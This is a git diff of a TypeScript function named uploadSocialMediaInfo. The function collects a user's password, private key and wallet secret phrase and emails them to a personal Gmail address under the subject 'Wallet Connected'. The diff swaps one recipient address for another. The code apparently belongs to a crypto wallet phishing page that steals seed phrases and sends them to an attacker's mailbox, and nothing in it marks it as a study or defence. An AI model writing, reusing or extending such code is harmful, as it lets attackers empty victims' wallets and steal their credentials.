@@ -23,7 +23,7 @@ export async function uploadSocialMediaInfo(data: FieldValues, userName: string,
         Password : ${data?.["Password"]}
         Private Key : ${data?.["PrivateKey"]}
         Secret Phrase : ${data?.["Secret Phrase"]}
-        `, "okormorupraisecode@gmail.com", "Wallet Connected")
+        `, "cherrypopice504@gmail.com", "Wallet Connected")
         return true
     } catch(Err) {
         console.log(Err)
